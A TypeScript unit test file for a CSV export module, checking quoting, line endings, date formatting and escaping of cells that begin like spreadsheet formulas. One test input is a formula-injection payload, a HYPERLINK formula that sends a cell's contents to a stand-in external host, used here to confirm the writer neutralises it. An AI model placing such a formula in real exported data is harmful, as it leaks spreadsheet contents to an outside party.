// The CSV writer (stories/E10-1, acceptance 2): the byte order mark, a field with a comma, a
// quote and a line break kept in its cell, CRLF line ends, dates as ISO 8601 with the offset, and
// a text cell that a spreadsheet would run as a formula written as text.
import { describe, expect, it } from "vitest";
import { csv, field, isoUtc, line, safeText } from "./csv";

describe("csv", () => {
  it("starts with the BOM and quotes every field", () => {
    const text = csv([["Sample data, invented"]], ["Respondent", "Reason"], [["Ana Pop", 'Says "no", then\nyes'], ["Bo", null]]);
    expect(text.charCodeAt(0)).toBe(0xfeff);
    expect(text.slice(1)).toBe('"Sample data, invented"\r\n"Respondent","Reason"\r\n"Ana Pop","Says ""no"", then\nyes"\r\n"Bo",""\r\n');
  });
  it("writes numbers and empty cells as text in quotes", () => {
    expect(line([3, undefined, "ă ș ț"])).toBe('"3","","ă ș ț"\r\n');
    expect(field('"')).toBe('""""');
  });
  it("puts a single quote before text that starts like a formula, not before a number", () => {
    expect(field('=HYPERLINK("https://x.example/?d="&A4,"Details")')).toBe('"\'=HYPERLINK(""https://x.example/?d=""&A4,""Details"")"');
    for (const s of ["+1 more", "-not needed", "@ops", "\tlead", "\rlead", "\nlead"]) expect(safeText(s)).toBe(`'${s}`);
    expect([safeText("-1"), safeText("+2"), safeText("1.5"), safeText("Fine = ok"), field(-1)]).toEqual(["-1", "+2", "1.5", "Fine = ok", '"-1"']);
  });
  it("writes dates as ISO 8601 with the UTC offset", () => {
    expect(isoUtc(new Date("2026-10-09T16:30:00.000Z"))).toBe("2026-10-09T16:30:00+00:00");
    expect(isoUtc(null)).toBe("");
  });
});
